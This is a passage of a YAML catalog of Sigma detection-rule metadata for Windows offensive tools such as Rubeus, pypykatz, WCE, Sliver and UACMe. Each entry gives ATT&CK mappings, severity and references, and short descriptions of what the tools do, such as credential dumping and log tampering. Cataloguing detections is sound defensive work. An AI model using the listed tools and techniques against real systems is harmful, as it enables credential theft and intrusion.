  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1007
  - T1012
  - T1057
  - T1082
  - T1083
  tags:
  - attack.execution
  - attack.discovery
  - attack.t1082
  - attack.t1057
  - attack.t1012
  - attack.t1083
  - attack.t1007
  time_window: ''
  references:
  - https://web.archive.org/web/20231210115125/http://www.xuetr.com/
  - https://www.crowdstrike.com/blog/falcon-overwatch-report-finds-increase-in-ecrime/
  - https://www.hexacorn.com/blog/2018/04/20/kernel-hacking-tool-you-might-have-never-heard-of-xuetr-pchunter/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 56c217c3-2de2-479b-990f-5c109ba8458f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_powersploit_empire_default_schtasks.yml
  name: HackTool - Default PowerSploit/Empire Scheduled Task Creation
  description: Detects the creation of a schtask via PowerSploit or Empire Default
    Configuration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.001
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.s0111
  - attack.g0022
  - attack.g0060
  - car.2013-08-001
  - attack.t1053.005
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1
  - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a34f79a3-8e5f-4cc3-b765-de00695452c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_powertool.yml
  name: HackTool - PowerTool Execution
  description: Detects the execution of the tool PowerTool which has the ability to
    kill a process, delete its process file, unload drivers, and delete the driver
    files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/
  - https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html
  - https://twitter.com/gbti_sa/status/1249653895900602375?lang=en
  - https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ff23ffbc-3378-435e-992f-0624dcf93ab4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_purplesharp_indicators.yml
  name: HackTool - PurpleSharp Execution
  description: Detects the execution of the PurpleSharp adversary simulation tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587
  tags:
  - attack.t1587
  - attack.resource-development
  time_window: ''
  references:
  - https://github.com/mvelazc0/PurpleSharp
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a29808fd-ef50-49ff-9c7a-59a9b040b404
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_pypykatz.yml
  name: HackTool - Pypykatz Credentials Dumping Activity
  description: Detects the usage of "pypykatz" to obtain stored credentials. Adversaries
    may attempt to extract credential material from the Security Account Manager (SAM)
    database through Windows registry where the SAM database is stored
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/skelsec/pypykatz
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0685b176-c816-4837-8e7b-1216f346636b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_quarks_pwdump.yml
  name: HackTool - Quarks PwDump Execution
  description: Detects usage of the Quarks PwDump tool via commandline arguments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/quarkslab/quarkspwdump
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 95022b85-ff2a-49fa-939a-d7b8f56eeb9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_redmimicry_winnti_playbook.yml
  name: HackTool - RedMimicry Winnti Playbook Execution
  description: Detects actions caused by the RedMimicry Winnti playbook a automated
    breach emulations utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1106
  - T1218.011
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1106
  - attack.t1059.003
  - attack.t1218.011
  time_window: ''
  references:
  - https://redmimicry.com/posts/redmimicry-winnti/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5589ab4f-a767-433c-961d-c91f3f704db1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_relay_attacks_tools.yml
  name: Potential SMB Relay Attack Tool Execution
  description: Detects different hacktools used for relay attacks on Windows for privilege
    escalation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Execution
  techniques:
  - T1557.001
  tags:
  - attack.collection
  - attack.execution
  - attack.credential-access
  - attack.t1557.001
  time_window: ''
  references:
  - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
  - https://pentestlab.blog/2017/04/13/hot-potato/
  - https://github.com/ohpe/juicy-potato
  - https://hunter2.gitbook.io/darthsidious/other/war-stories/domain-admin-in-30-minutes
  - https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire
  - https://www.localpotato.com/
  false_positives:
  - Legitimate files with these rare hacktool names
  notes: ''
- detection_id: 7ec2c172-dceb-4c10-92c9-87c1881b7e18
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_rubeus.yml
  name: HackTool - Rubeus Execution
  description: Detects the execution of the hacktool Rubeus via PE information of
    command line parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1550.003
  - T1558.003
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1003
  - attack.t1558.003
  - attack.lateral-movement
  - attack.t1550.003
  time_window: ''
  references:
  - https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus
  - https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
  - https://github.com/GhostPack/Rubeus
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b1876533-4ed5-4a83-90f3-b8645840a413
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_safetykatz.yml
  name: HackTool - SafetyKatz Execution
  description: Detects the execution of the hacktool SafetyKatz via PE information
    and default Image name
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/GhostPack/SafetyKatz
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7679d464-4f74-45e2-9e01-ac66c5eb041a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_secutyxploded.yml
  name: HackTool - SecurityXploded Execution
  description: Detects the execution of SecurityXploded Tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555
  tags:
  - attack.credential-access
  - attack.t1555
  time_window: ''
  references:
  - https://securityxploded.com/
  - https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 52ff7941-8211-46f9-84f8-9903efb7077d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_selectmyparent.yml
  name: HackTool - PPID Spoofing SelectMyParent Tool Execution
  description: Detects the use of parent process ID spoofing tools like Didier Stevens
    tool SelectMyParent
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.004
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1134.004
  time_window: ''
  references:
  - https://pentestlab.blog/2020/02/24/parent-pid-spoofing/
  - https://www.picussecurity.com/resource/blog/how-to-detect-parent-pid-ppid-spoofing-attacks
  - https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing
  - https://www.virustotal.com/gui/search/filename%253A*spoof*%2520filename%253A*ppid*/files
  false_positives:
  - Unlikely
  notes: ''
- detection_id: cf93e05e-d798-4d9e-b522-b0248dc61eaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharp_chisel.yml
  name: HackTool - SharpChisel Execution
  description: Detects usage of the Sharp Chisel via the commandline arguments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090.001
  tags:
  - attack.command-and-control
  - attack.t1090.001
  time_window: ''
  references:
  - https://github.com/shantanu561993/SharpChisel
  - https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c7d33b50-f690-4b51-8cfb-0fb912a31e57
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharp_dpapi_execution.yml
  name: HackTool - SharpDPAPI Execution
  description: 'Detects the execution of the SharpDPAPI tool based on CommandLine
    flags and PE metadata.

    SharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1134.003
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1134.001
  - attack.t1134.003
  time_window: ''
  references:
  - https://github.com/GhostPack/SharpDPAPI
  false_positives:
  - Unknown
  notes: ''
- detection_id: f89b08d0-77ad-4728-817b-9b16c5a69c7a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharp_impersonation.yml
  name: HackTool - SharpImpersonation Execution
  description: Detects execution of the SharpImpersonation tool. Which can be used
    to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1134.003
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1134.001
  - attack.t1134.003
  time_window: ''
  references:
  - https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/
  - https://github.com/S3cur3Th1sSh1t/SharpImpersonation
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9f8fc146-1d1a-4dbf-b8fd-dfae15e08541
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharp_ldap_monitor.yml
  name: HackTool - SharpLDAPmonitor Execution
  description: Detects execution of the SharpLDAPmonitor. Which can monitor the creation,
    deletion and changes to LDAP objects.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://github.com/p0dalirius/LDAPmonitor
  false_positives:
  - Unknown
  notes: ''
- detection_id: 26488ad0-f9fd-4536-876f-52fea846a2e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpersist.yml
  name: HackTool - SharPersist Execution
  description: Detects the execution of the hacktool SharPersist - used to deploy
    various different kinds of persistence mechanisms
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit
  - https://github.com/mandiant/SharPersist
  false_positives:
  - Unknown
  notes: ''
- detection_id: bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpevtmute.yml
  name: HackTool - SharpEvtMute Execution
  description: Detects the use of SharpEvtHook, a tool that tampers with the Windows
    event logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://github.com/bats3c/EvtMute
  false_positives:
  - Unknown
  notes: ''
- detection_id: d9367cbb-c2e0-47ce-bdc0-128cb6da898d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpldapwhoami.yml
  name: HackTool - SharpLdapWhoami Execution
  description: Detects SharpLdapWhoami, a whoami alternative that queries the LDAP
    service on a domain controller
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  - car.2016-03-001
  time_window: ''
  references:
  - https://github.com/bugch3ck/SharpLdapWhoami
  false_positives:
  - Programs that use the same command line flags
  notes: ''
- detection_id: 055fb54c-a8f4-4aee-bd44-f74cf30a0d9d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpmove.yml
  name: HackTool - SharpMove Tool Execution
  description: 'Detects the execution of SharpMove, a .NET utility performing multiple
    tasks such as "Task Creation", "SCM" query, VBScript execution using WMI via its
    PE metadata and command line options.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://github.com/0xthirteen/SharpMove/
  - https://pentestlab.blog/tag/sharpmove/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 38a1ac5f-9c74-47d2-a345-dd6f5eb4e7c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpsuccessor_execution.yml
  name: HKTL - SharpSuccessor Privilege Escalation Tool Execution
  description: 'Detects the execution of SharpSuccessor, a tool used to exploit the
    BadSuccessor attack for privilege escalation in WinServer 2025 Active Directory
    environments.

    Successful usage of this tool can let the attackers gain the domain admin privileges
    by exploiting the BadSuccessor vulnerability.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  time_window: ''
  references:
  - https://github.com/logangoins/SharpSuccessor
  false_positives:
  - Unknown
  notes: ''
- detection_id: c484e533-ee16-4a93-b6ac-f0ea4868b2f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpup.yml
  name: HackTool - SharpUp PrivEsc Tool Execution
  description: Detects the use of SharpUp, a tool for local privilege escalation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Persistence
  techniques:
  - T1569.002
  - T1574.005
  - T1615
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.discovery
  - attack.execution
  - attack.t1615
  - attack.t1569.002
  - attack.t1574.005
  time_window: ''
  references:
  - https://github.com/GhostPack/SharpUp
  false_positives:
  - Unknown
  notes: ''
- detection_id: b2317cfa-4a47-4ead-b3ff-297438c0bc2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpview.yml
  name: HackTool - SharpView Execution
  description: Adversaries may look for details about the network configuration and
    settings of systems they access or through information discovery of remote systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  - T1049
  - T1069.002
  - T1135
  - T1482
  tags:
  - attack.discovery
  - attack.t1049
  - attack.t1069.002
  - attack.t1482
  - attack.t1135
  - attack.t1033
  time_window: ''
  references:
  - https://github.com/tevora-threat/SharpView/
  - https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview
  false_positives:
  - Unknown
  notes: ''
- detection_id: b0ce780f-10bd-496d-9067-066d23dc3aa5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sharpwsus_wsuspendu_execution.yml
  name: HackTool - SharpWSUS/WSUSpendu Execution
  description: 'Detects the execution of SharpWSUS or WSUSpendu, utilities that allow
    for lateral movement through WSUS.

    Windows Server Update Services (WSUS) is a critical component of Windows systems
    and is frequently configured in a way that allows an attacker to circumvent internal
    networking limitations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1210
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1210
  time_window: ''
  references:
  - https://labs.nettitude.com/blog/introducing-sharpwsus/
  - https://github.com/nettitude/SharpWSUS
  - https://web.archive.org/web/20210512154016/https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 03552375-cc2c-4883-bbe4-7958d5a980be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_silenttrinity_stager.yml
  name: HackTool - SILENTTRINITY Stager Execution
  description: Detects SILENTTRINITY stager use via PE metadata
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071
  tags:
  - attack.command-and-control
  - attack.t1071
  time_window: ''
  references:
  - https://github.com/byt3bl33d3r/SILENTTRINITY
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 42333b2c-b425-441c-b70e-99404a17170f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sliver_c2_execution_pattern.yml
  name: HackTool - Sliver C2 Implant Activity Pattern
  description: Detects process activity patterns as seen being used by Sliver C2 framework
    implants
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/implant/sliver/shell/shell_windows.go#L36
  - https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e92a4287-e072-4a40-9739-370c106bb750
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_soaphound_execution.yml
  name: HackTool - SOAPHound Execution
  description: 'Detects the execution of SOAPHound, a .NET tool for collecting Active
    Directory data, using specific command-line arguments that may indicate an attempt
    to extract sensitive AD information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087
  tags:
  - attack.discovery
  - attack.t1087
  time_window: ''
  references:
  - https://github.com/FalconForceTeam/SOAPHound
  - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7a4d9232-92fc-404d-8ce1-4c92e7caf539
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_stracciatella_execution.yml
  name: HackTool - Stracciatella Execution
  description: Detects Stracciatella which executes a Powershell runspace from within
    C# (aka SharpPick technique) with AMSI, ETW and Script Block Logging disabled
    based on PE metadata characteristics.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1562.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/mgeeky/Stracciatella
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8a7e90c5-fe6e-45dc-889e-057fe4378bd9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_sysmoneop.yml
  name: HackTool - SysmonEOP Execution
  description: Detects the execution of the PoC that can be used to exploit Sysmon
    CVE-2022-41120
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - cve.2022-41120
  - attack.t1068
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/Wh04m1001/SysmonEoP
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 69ca006d-b9a9-47f5-80ff-ecd4d25d481a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_trufflesnout.yml
  name: HackTool - TruffleSnout Execution
  description: Detects the use of TruffleSnout.exe an iterative AD discovery toolkit
    for offensive operators, situational awareness and targeted low noise enumeration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1482
  tags:
  - attack.discovery
  - attack.t1482
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md
  - https://github.com/dsnezhkov/TruffleSnout
  - https://github.com/dsnezhkov/TruffleSnout/blob/7c2f22e246ef704bc96c396f66fa854e9ca742b9/TruffleSnout/Docs/USAGE.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: d38d2fa4-98e6-4a24-aff1-410b0c9ad177
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_uacme.yml
  name: HackTool - UACMe Akagi Execution
  description: Detects the execution of UACMe, a tool used for UAC bypasses, via default
    PE metadata
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7aa7009a-28b9-4344-8c1f-159489a390df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_wce.yml
  name: HackTool - Windows Credential Editor (WCE) Execution
  description: 'Detects the use of Windows Credential Editor (WCE), a popular post-exploitation
    tool used to extract plaintext passwords, hash, PIN code and Kerberos tickets
    from memory.

    It is often used by threat actors for credential dumping and lateral movement
    within compromised networks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0005
  time_window: ''
  references:
  - https://www.ampliasecurity.com/research/windows-credentials-editor/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 98b53e78-ebaf-46f8-be06-421aafd176d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_winpeas.yml
  name: HackTool - winPEAS Execution
  description: WinPEAS is a script that search for possible paths to escalate privileges
    on Windows hosts. The checks are explained on book.hacktricks.xyz
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  - T1082
  - T1087
  tags:
